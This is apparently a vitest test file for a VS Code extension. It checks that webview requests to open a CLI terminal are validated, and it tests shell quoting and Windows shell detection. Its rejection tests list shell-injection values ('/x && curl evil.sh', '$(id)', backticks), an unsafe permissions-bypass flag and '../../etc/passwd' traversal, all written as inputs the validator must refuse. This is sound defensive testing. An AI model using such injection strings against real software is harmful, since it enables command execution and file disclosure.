/**
 * `open_claude_in_terminal`: the official `JI0` validator and the command line
 * `claude-vscode.terminal.open` builds (`Qd0` -> `Ja$` / `za$` / `az`).
 *
 * The rejections carry the weight. The webview is untrusted input, and this
 * request is the one that puts a string in front of a shell, so anything that is
 * not a bare slash command or `--resume <session id>` has to be refused before a
 * terminal exists.
 */
import { describe, expect, it } from 'vitest';
import {
  INVALID_REQUEST_MESSAGE,
  SLASH_COMMAND_RE,
  TerminalLaunchError,
  UNQUOTABLE_FOR_CMD_MESSAGE,
  basenameKey,
  buildCommandLine,
  detectWindowsShell,
  isTerminalLocation,
  isUnusableProfilePath,
  isValidOpenClaudeInTerminalRequest,
  quoteExecutable,
  readDefaultProfile,
  shellKindFromBasename,
  shellQuote,
  shouldDisposeAfterExecution,
  terminalPlacement,
  validateSessionId,
} from '../src/services/claude/terminalLaunch';

const SESSION = '3f2504e0-4f89-41d3-9a0c-0305e82c3301';

describe('JI0: what the webview may ask for', () => {
  it('accepts an empty payload (the login screen sends no arguments at all)', () => {
    expect(isValidOpenClaudeInTerminalRequest({})).toBe(true);
  });

  it('accepts the "/" row: no prompt, no args', () => {
    expect(isValidOpenClaudeInTerminalRequest({ prompt: undefined, args: undefined })).toBe(true);
  });

  it('accepts a bare slash command', () => {
    for (const prompt of ['/fast', '/review', '/a', '/security-review', '/x-y-z']) {
      expect(isValidOpenClaudeInTerminalRequest({ prompt })).toBe(true);
    }
  });

  it('accepts an empty args array, and --resume with a session id', () => {
    expect(isValidOpenClaudeInTerminalRequest({ args: [] })).toBe(true);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', SESSION] })).toBe(true);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/fast', args: ['--resume', SESSION] })).toBe(true);
  });

  it('accepts the terminal-kickback shape: a slash command with []', () => {
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/login', args: [] })).toBe(true);
  });

  it('rejects a shell injection dressed as a slash command', () => {
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/x; rm' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/x && curl evil.sh' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/x`whoami`' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/x $(id)' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: "/x'" })).toBe(false);
  });

  it('rejects a prompt that is not a slash command', () => {
    expect(isValidOpenClaudeInTerminalRequest({ prompt: 'hello' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/Review' })).toBe(false); // uppercase
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/9lives' })).toBe(false); // digit first
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/-x' })).toBe(false); // dash first
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '/a b' })).toBe(false); // space
    expect(isValidOpenClaudeInTerminalRequest({ prompt: '//x' })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ prompt: `/a${'b'.repeat(64)}` })).toBe(false); // 64 chars after the first
  });

  it('rejects a prompt that is not a string', () => {
    for (const prompt of [null, 42, {}, ['/fast'], true]) {
      expect(isValidOpenClaudeInTerminalRequest({ prompt })).toBe(false);
    }
  });

  it('rejects unknown flags and extra args', () => {
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--dangerously-skip-permissions'] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--settings', '/tmp/evil.json'] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume'] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', SESSION, '--print'] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['-r', SESSION] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['resume', SESSION] })).toBe(false);
  });

  it('rejects a --resume value that is not a session id', () => {
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', '../x'] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', '../../etc/passwd'] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', `${SESSION}/../x`] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', ''] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', SESSION.replace('-', '')] })).toBe(false);
    expect(isValidOpenClaudeInTerminalRequest({ args: ['--resume', null] })).toBe(false);
  });

  it('rejects args that are not an array', () => {
    for (const args of [null, '--resume', 42, { 0: '--resume' }]) {
      expect(isValidOpenClaudeInTerminalRequest({ args })).toBe(false);
    }
  });

  it('carries the official error message', () => {
    expect(INVALID_REQUEST_MESSAGE).toBe(
      'open_claude_in_terminal: only a bare slash command and --resume <session id> can be passed from the webview'
    );
  });
});

describe('y0 / SD0: session ids', () => {
  it('accepts a uuid in either case', () => {
    expect(validateSessionId(SESSION)).toBe(SESSION);
    expect(validateSessionId(SESSION.toUpperCase())).toBe(SESSION.toUpperCase());
  });

  it('rejects anything else', () => {
    for (const id of ['', 'not-a-uuid', `${SESSION} `, ` ${SESSION}`, 42, null, undefined]) {
      expect(validateSessionId(id)).toBeNull();
    }
  });

  it('is not a global regex, so repeated calls agree', () => {
    expect(validateSessionId(SESSION)).not.toBeNull();
    expect(validateSessionId(SESSION)).not.toBeNull();
    expect(SLASH_COMMAND_RE.test('/fast')).toBe(true);
    expect(SLASH_COMMAND_RE.test('/fast')).toBe(true);
  });
});

describe('$d0: location', () => {
  it('accepts the three official values', () => {
    expect(isTerminalLocation('bottom')).toBe(true);
    expect(isTerminalLocation('window')).toBe(true);
    expect(isTerminalLocation('beside')).toBe(true);
  });

  it('rejects anything else, which the official turns into undefined', () => {
    for (const value of ['panel', '', null, 42, {}]) {
      expect(isTerminalLocation(value)).toBe(false);
    }
  });

  it('maps to the official placement', () => {
    expect(terminalPlacement('bottom')).toBe('panel');
    expect(terminalPlacement('window')).toBe('one');
    expect(terminalPlacement('beside')).toBe('beside');
    expect(terminalPlacement(undefined)).toBe('beside');
  });
});

describe('az: POSIX quoting', () => {
  it('passes safe characters through', () => {
    expect(shellQuote(['--resume', SESSION])).toBe(`--resume ${SESSION}`);
    expect(shellQuote(['/security-review'])).toBe('/security-review');
  });

  it('quotes an empty string and anything with a space', () => {
    expect(shellQuote([''])).toBe("''");
    expect(shellQuote(['a b'])).toBe("'a b'");
  });

  it('closes and reopens the quote around a single quote', () => {
    expect(shellQuote(["it's"])).toBe(`'it'"'"'s'`);
  });

  it('leaves every JI0-accepted argument untouched, so the shell does not matter', () => {
    const accepted = ['--resume', SESSION, '/fast', '/security-review', '/a-b-c'];
    for (const value of accepted) expect(shellQuote([value])).toBe(value);
  });
});

describe('za$: the command line', () => {
  const exe = '"C:\\ext\\resources\\native-binary\\claude.exe"';

  it('is the executable alone when there is nothing to pass', () => {
    expect(buildCommandLine(exe)).toBe(exe);
    expect(buildCommandLine(exe, [])).toBe(exe);
    expect(buildCommandLine(exe, [], undefined)).toBe(exe);
  });

  it('puts the args first and the prompt last', () => {
    expect(buildCommandLine(exe, ['--resume', SESSION])).toBe(`${exe} --resume ${SESSION}`);
    expect(buildCommandLine(exe, [], '/fast')).toBe(`${exe} /fast`);
    expect(buildCommandLine(exe, ['--resume', SESSION], '/fast')).toBe(`${exe} --resume ${SESSION} /fast`);
  });
});

describe('Ja$: quoting Forge\'s own binary for the shell', () => {
  const win = 'C:\\Users\\me\\.vscode\\extensions\\forge\\resources\\native-binary\\claude.exe';
  const posix = '/home/me/.vscode/extensions/forge/resources/native-binary/claude';

  it('uses POSIX quoting off Windows', () => {
    expect(quoteExecutable('darwin', posix, 'unknown')).toBe(posix);
    expect(quoteExecutable('linux', '/opt/my apps/claude', 'unknown')).toBe("'/opt/my apps/claude'");
  });

  it('uses the call operator in PowerShell, so a quoted path is executed and not printed', () => {
    expect(quoteExecutable('win32', win, 'powershell')).toBe(`& '${win}'`);
  });

  it('doubles a single quote, and the smart quotes PowerShell also treats as quotes', () => {
    expect(quoteExecutable('win32', "C:\\o'brien\\claude.exe", 'powershell')).toBe("& 'C:\\o''brien\\claude.exe'");
    expect(quoteExecutable('win32', 'C:\\a\u2019b\\claude.exe', 'powershell')).toBe(
      "& 'C:\\a\u2019\u2019b\\claude.exe'"
    );
  });

  it('double-quotes for Command Prompt and for a shell it could not identify', () => {
    expect(quoteExecutable('win32', win, 'cmd')).toBe(`"${win}"`);
    expect(quoteExecutable('win32', win, 'unknown')).toBe(`"${win}"`);
  });

  it('uses POSIX quoting for Git Bash on Windows', () => {
    expect(quoteExecutable('win32', win, 'bash')).toBe(`'${win}'`);
  });

  it('refuses a cmd launch it cannot quote, rather than running the wrong thing', () => {
    const percent = 'C:\\100%\\claude.exe';
    expect(() => quoteExecutable('win32', percent, 'cmd')).toThrow(TerminalLaunchError);
    expect(() => quoteExecutable('win32', percent, 'cmd')).toThrow(UNQUOTABLE_FOR_CMD_MESSAGE);
    expect(() => quoteExecutable('win32', 'C:\\a!b\\claude.exe', 'unknown')).toThrow(TerminalLaunchError);
    // PowerShell and bash quote those paths fine, so they are not blocked.
    expect(() => quoteExecutable('win32', percent, 'powershell')).not.toThrow();
    expect(() => quoteExecutable('win32', percent, 'bash')).not.toThrow();
  });
});

describe('Qa$: which Windows shell the default profile starts', () => {
  it('trusts an explicit profile source', () => {
    expect(detectWindowsShell({ profileSource: 'PowerShell' })).toBe('powershell');
    expect(detectWindowsShell({ profileSource: 'Git Bash' })).toBe('bash');
  });

  it('reads the profile path', () => {
    expect(detectWindowsShell({ profilePath: 'C:\\WINDOWS\\System32\\cmd.exe' })).toBe('cmd');
    expect(detectWindowsShell({ profilePath: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe' })).toBe('powershell');
    expect(detectWindowsShell({ profilePath: 'C:\\Program Files\\Git\\bin\\bash.exe' })).toBe('bash');
  });

  it('accepts a path list and a {path} object, as VS Code allows', () => {
    expect(detectWindowsShell({ profilePath: ['C:\\a\\pwsh.exe', 'C:\\b\\powershell.exe'] })).toBe('powershell');
    expect(detectWindowsShell({ profilePath: { path: 'C:\\WINDOWS\\System32\\cmd.exe' } })).toBe('cmd');
  });

  it('prefers powershell when a mixed list disagrees', () => {
    expect(detectWindowsShell({ profilePath: ['C:\\a\\cmd.exe', 'C:\\b\\pwsh.exe'] })).toBe('powershell');
  });

  it('treats a ${env:...} path and an 8.3 short name as powershell', () => {
    expect(detectWindowsShell({ profilePath: '${env:windir}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' })).toBe(
      'powershell'
    );
    expect(detectWindowsShell({ profilePath: 'C:\\PROGRA~1\\somesh.exe' })).toBe('unknown');
    expect(detectWindowsShell({ profilePath: 'C:\\x\\LONGNA~1.exe' })).toBe('powershell');
  });

  it('falls back to the built-in profile name when no path identifies it', () => {
    expect(detectWindowsShell({ profileName: 'Windows PowerShell' })).toBe('powershell');
    expect(detectWindowsShell({ profileName: 'Command Prompt' })).toBe('cmd');
    expect(detectWindowsShell({ profileName: 'Git Bash' })).toBe('bash');
    expect(detectWindowsShell({ profileName: 'Ubuntu (WSL)' })).toBe('bash');
  });

  it('ignores the built-in name once a profiles entry has been read', () => {
    expect(detectWindowsShell({ profileName: 'Command Prompt', suppressBuiltinName: true })).toBe('powershell');
  });

  it('falls back to vscode.env.shell, then to powershell', () => {
    expect(detectWindowsShell({ envShell: 'C:\\WINDOWS\\System32\\cmd.exe' })).toBe('cmd');
    expect(detectWindowsShell({ envShell: 'C:\\Program Files\\Git\\bin\\bash.exe' })).toBe('bash');
    expect(detectWindowsShell({})).toBe('powershell');
    expect(detectWindowsShell({ envShell: '' })).toBe('powershell');
    expect(detectWindowsShell({ envShell: 'C:\\x\\nushell.exe' })).toBe('unknown');
  });

  it('drops a profile path VS Code could not run', () => {
    expect(detectWindowsShell({ profilePath: 'C:\\a\\cmd?.exe', profileName: 'Windows PowerShell' })).toBe('powershell');
    expect(isUnusableProfilePath('C:\\a\\b|c')).toBe(true);
    expect(isUnusableProfilePath('C:\\a\\b\u0001c')).toBe(true);
    expect(isUnusableProfilePath('C:\\a\\b:c')).toBe(true);
    expect(isUnusableProfilePath('C:\\WINDOWS\\System32\\cmd.exe')).toBe(false);
  });

  it('reduces a path to a comparable basename', () => {
    expect(basenameKey('C:\\WINDOWS\\System32\\CMD.EXE')).toBe('cmd.exe');
    expect(basenameKey('/usr/bin/zsh')).toBe('zsh');
    expect(basenameKey('C:\\a\\b.exe. ')).toBe('b.exe');
    expect(basenameKey(undefined)).toBe('');
  });

  it('classifies a basename', () => {
    expect(shellKindFromBasename('powershell.exe')).toBe('powershell');
    expect(shellKindFromBasename('pwsh')).toBe('powershell');
    expect(shellKindFromBasename('cmd.exe')).toBe('cmd');
    expect(shellKindFromBasename('wsl.exe')).toBe('bash');
    expect(shellKindFromBasename('nu.exe')).toBe('unknown');
    expect(shellKindFromBasename('.exe')).toBe('unknown');
  });
});

describe('tn$: reading the default profile out of settings', () => {
  it('returns nothing when the default profile is unset or absent', () => {
    expect(readDefaultProfile({ 'Command Prompt': {} }, undefined)).toEqual({});
    expect(readDefaultProfile({ 'Command Prompt': {} }, 'PowerShell')).toEqual({});
    expect(readDefaultProfile(null, 'PowerShell')).toEqual({});
  });

  it('takes a known source, and suppresses the built-in name either way', () => {
    expect(readDefaultProfile({ mine: { source: 'PowerShell' } }, 'mine')).toEqual({
      suppressBuiltinName: true,
      profileSource: 'PowerShell',
    });
    expect(readDefaultProfile({ mine: { source: 'Something Else' } }, 'mine')).toEqual({ suppressBuiltinName: true });
  });

  it('takes a path when there is no source', () => {
    expect(readDefaultProfile({ mine: { path: 'C:\\x\\pwsh.exe' } }, 'mine')).toEqual({
      suppressBuiltinName: true,
      profilePath: 'C:\\x\\pwsh.exe',
    });
  });

  it('does not read through the prototype chain', () => {
    expect(readDefaultProfile({}, 'toString')).toEqual({});
  });
});

describe('Ya$: disposing the terminal once the command has finished', () => {
  const quoted = '"C:\\ext\\claude.exe"';
  const bare = '/home/me/claude';

  it('never disposes on a non-zero exit', () => {
    expect(shouldDisposeAfterExecution(bare, bare, 1)).toBe(false);
    expect(shouldDisposeAfterExecution(bare, bare, undefined)).toBe(false);
  });

  it('disposes when the shell reports back the command that was sent', () => {
    expect(shouldDisposeAfterExecution(bare, bare, 0)).toBe(true);
    expect(shouldDisposeAfterExecution('claude --resume x', 'anything', 0)).toBe(true);
  });

  it('leaves a quoted command line alone, and one the shell rewrote', () => {
    expect(shouldDisposeAfterExecution(quoted, quoted, 0)).toBe(false);
    expect(shouldDisposeAfterExecution('something else', bare, 0)).toBe(false);
  });
});
